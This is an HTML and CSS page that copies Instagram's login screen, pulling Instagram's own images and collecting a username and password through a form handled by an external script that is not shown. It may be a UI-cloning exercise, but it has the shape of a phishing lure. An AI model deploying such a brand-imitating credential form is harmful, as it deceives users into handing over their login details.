<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            display: flex;
            align-items: center;
        }
        .phone-preview {
            margin-right: 40px;
        }
        .phone-preview img {
            max-width: 350px;
        }
        .login-container {
            background-color: #fff;
            padding: 40px;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            width: 350px;
            text-align: center;
        }
        .login-container img {
            width: 200px;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            margin: 8px 0;
            padding: 12px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
        }
        button {
            background-color: #3897f0;
            color: white;
            font-weight: bold;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 4px;
            margin-top: 10px;
        }
        button:hover {
            background-color: #3078c9;
        }
        .or {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
        }
        .or::before, .or::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or span {
            margin: 0 15px;
            font-weight: bold;
        }
        .facebook-login {
            color: #385185;
            font-weight: bold;
            margin-top: 10px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 12px;
        }
        .signup-section {
            margin-top: 20px;
        }
        .signup-section a {
            text-decoration: none;
            color: #3897f0;
            font-weight: bold;
        }
        .get-app {
            margin-top: 15px;
            text-align: center;
        }
        .get-app p {
            color: #8e8e8e;
            font-size: 14px;
        }
        .get-app img {
            width: 136px;
            margin: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-preview">
            <img src="https://www.instagram.com/images/instagram/xig/homepage/screenshots/screenshot4.png?__d=www" alt="Phone Preview">
        </div>
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <p id="message"></p>
            <div class="or">
                <span>OR</span>
            </div>
            <a href="#" class="facebook-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
            <div class="signup-section">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            <div class="get-app">
                <p>Get the app.</p>
                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"></a>
                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store"></a>
            </div>
        </div>
    </div>
    <script src="index.js"></script>
</body>
</html>
